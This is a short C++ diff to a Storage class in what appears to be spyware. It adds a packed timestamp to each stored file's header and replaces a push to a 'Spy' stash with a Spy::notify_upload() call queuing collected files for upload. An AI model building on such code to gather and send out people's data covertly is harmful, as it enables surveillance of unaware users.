@@ -1,9 +1,12 @@
 #include "storage.h"
-#include "stash.h"
 
-void Storage::push_to_stash() const
+unsigned int Storage::get_current_time_seconds()
 {
-	Spy::get_stash()->push(file_path);
+	SYSTEMTIME stime;
+	GetLocalTime(&stime);
+	// h[5] m[6] s[6] d[5] M[4] y[6] (last two numbers)
+	return stime.wHour | (stime.wMinute << 5) | (stime.wSecond << 11) |
+		(stime.wDay << 17) | (stime.wMonth << 22) | ((stime.wYear % 2000) << 26);
 }
 
 void Storage::write(const void * chunk, size_t n)
@@ -21,11 +24,13 @@ Storage::Storage(const char * file_path, const char * magic)
 	:Storable(file_path, "w+b")
 {
 	this->write(magic, 2);
+	unsigned int seconds = get_current_time_seconds();
+	this->write(&seconds, sizeof(unsigned int));
 	this->position = 0;
 }
 
 Storage::~Storage()
 {
-	if (position > 2)
-		push_to_stash();
+	if (position > 6)
+		Spy::notify_upload();
 }
